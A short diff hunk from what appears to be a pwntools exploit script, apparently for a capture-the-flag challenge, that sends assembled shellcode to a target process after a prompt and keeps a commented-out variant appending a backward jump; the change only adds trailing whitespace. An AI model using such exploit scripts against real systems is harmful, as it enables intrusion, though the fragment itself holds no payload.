@@ -39,7 +39,7 @@ y:
 '''
 
 y.sendafter( ':' , asm( _asm ) )
-#y.sendafter( ':' , asm( _asm ) + '\x75\xfa'  ) # jne    0xfffffffffffffffc -> jne -4
+#y.sendafter( ':' , asm( _asm ) + '\x75\xfa'  ) # jne    0xfffffffffffffffc -> jne -4 
 
 sleep(0.7)
 
